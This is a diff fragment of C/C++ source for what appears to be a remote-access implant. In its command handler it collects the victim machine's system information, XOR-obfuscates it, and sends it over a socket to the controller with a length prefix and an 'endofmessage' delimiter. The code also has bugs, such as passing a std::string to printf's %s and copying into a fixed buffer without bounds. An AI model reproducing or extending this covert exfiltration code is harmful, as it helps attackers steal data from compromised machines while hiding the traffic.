@@ -684,10 +684,10 @@ int main() {
 				xor_func(c); // xor the chunk
 				const char* chunkBuffer = c; // put xor'd chunk in this temp buffer
 				printf("sending %d bytes\n", strlen(chunkBuffer)); //debug
-				send(sock, chunkBuffer, strlen(chunkBuffer), 0);
+				send(sock, chunkBuffer, DEFAULT_BUFLEN, 0);
 				offset += DEFAULT_BUFLEN;
 			}
-			strcpy(buf, "gettfouttahereistfg"); // send string to signify end of message
+			strcpy(buf, "endofmessage"); // send string to signify end of message
 			xor_func(buf);
 			send(sock, buf, strlen(buf), 0);
 
@@ -697,18 +697,40 @@ int main() {
 			printf("systeminfo\n");
 			data = getSysInfo();
 			printf("systeminfo length: %d\n", data.length()); //debug
-			while (offset < data.length()) {
-				string chunk = data.substr(offset, DEFAULT_BUFLEN);
-				char* c = const_cast<char*>(chunk.c_str()); // convert chunk to c_str
-				xor_func(c); // xor the chunk
-				const char* chunkBuffer = c; // put xor'd chunk in this temp buffer
-				printf("sending %d bytes\n", strlen(chunkBuffer));  //debug
-				send(sock, chunkBuffer, strlen(chunkBuffer), 0); // send chunk
-				offset += DEFAULT_BUFLEN;
-			}
-			strcpy(buf, "gettfouttahereistfg"); // send string to signify end of message
-			xor_func(buf); // xor end string
-			send(sock, buf, strlen(buf), 0); //send end string
+
+			// make send data function
+
+			// send message length
+			printf("messagelength content: \n\n%s", data);
+			// strcpy(buf, data.c_str());  // load data into buffer
+			
+			int msgLen = data.length(); // get length of message
+			stringstream ss; // init stringstream to hold msgLen
+			ss << std::hex << msgLen; //send message length in hex
+			string msgLenStr = ss.str(); // typecast stringstream to c++ string
+			char* msgLenChar = const_cast<char*>(msgLenStr.c_str()); // typecast c++ string into char*
+			xor_func(msgLenChar); // xor the message length before sending
+			char lenBuf[6]; // 5 char spaces for int, means message length can total up to a megabyte
+			strcpy(lenBuf, msgLenChar); // load xor'd data into buffer
+			printf("message length xor'd: \n\n%s", lenBuf); //debug
+			printf("sending %d bytes\n", strlen(lenBuf));  //debug
+			send(sock, lenBuf, strlen(lenBuf), 0); // send data
+
+			// send message
+
+			printf("systeminfo content: \n\n%s", data);
+			// strcpy(buf, data.c_str());  // load data into buffer
+			char* d = const_cast<char*>(data.c_str()); // cast data as char* so it can be xor'd
+			xor_func(d); // xor the data before sending
+			strcpy(buf, d); // load xor'd data into buffer
+			printf("systeminfo xor'd: \n\n%s", buf);
+			printf("sending %d bytes\n", strlen(buf));  //debug
+			send(sock, buf, strlen(buf), 0); // send data
+			
+
+			strcpy(buf, "endofmessage"); // put end delimiter in buffer
+			xor_func(buf); // xor buffer
+			send(sock, buf, strlen(buf), 0); //send end delimiter string
 
 		} break;
 
